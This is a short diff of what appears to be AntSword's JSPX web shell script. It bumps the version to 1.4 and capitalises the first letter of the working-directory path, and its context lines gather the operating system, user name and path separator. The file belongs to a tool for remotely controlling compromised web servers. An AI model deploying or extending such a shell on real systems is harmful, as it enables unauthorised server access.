@@ -21,7 +21,7 @@
     注意：以上是两行
  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 
-Ver:1.3
+Ver:1.4
 -->
 <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">
     <jsp:directive.page contentType="text/html" pageEncoding="UTF-8" />
@@ -274,6 +274,7 @@ Ver:1.3
                 String cd = this.getClass().getResource("/").getPath();
                 d = new File(cd).getParent();
             }
+            d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
             String serverInfo = (String)System.getProperty("os.name");
             String separator = File.separator;
             String user = (String)System.getProperty("user.name");
